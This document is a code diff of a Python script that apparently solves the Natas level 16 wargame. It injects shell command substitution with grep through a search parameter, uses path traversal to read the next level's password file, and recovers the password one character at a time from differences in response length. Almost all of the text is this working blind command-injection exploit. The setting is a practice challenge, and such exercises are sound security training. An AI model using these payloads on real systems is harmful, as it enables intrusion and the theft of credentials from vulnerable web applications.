@@ -23,31 +23,31 @@ characters = list(string.ascii_letters+string.digits)
 
 #first lets try to see if we can find which characters are in the password
 
-valid_characters = list() #empty list to add valid characters too
+#valid_characters = list() #empty list to add valid characters too
 
-for c in characters:
-        payload = '?needle=%24%28grep+{}+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(c)
-        r = requests.get(url+payload, headers=headers)
-        if len(r.text) > 1105:
-                valid_characters.append(c)
+#for c in characters:
+#        payload = '?needle=%24%28grep+{}+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(c)
+#        r = requests.get(url+payload, headers=headers)
+#        if len(r.text) > 1105:
+#                valid_characters.append(c)
 
-print('there are {} valid characters: '.format(len(valid_characters)))
+#print('there are {} valid characters: '.format(len(valid_characters)))
 
-for v in valid_characters:
-        print(v, end='')
+#for v in valid_characters:
+#        print(v, end='')
 
-print('\n')
+#print('\n')
 
-for c in range(0,length): #loop for each character in the password
-    for v in valid_characters: #loop for each possible character as defined above (upper + lower + digits)
-        payload = '?needle=%24%7B%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29%3A{}%3A1%7D&submit=Search'.format(offset, v, c)
-        
-        #maybe we need a different payload? idk, work in progress...
+for p in range(0,length): #loop for each character in the password
+    for c in characters: #loop for each possible character as defined above (letters + digits)
+        payload = '?needle=%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29+&submit=Search'.format(offset, c)
 
         r = requests.get(url+payload, headers=headers)
         if len(r.text) > 1105:
-            password += i
+            password += c
             break
+            
     offset += '.'
 
+print('\n')
 print('password is: '+password)
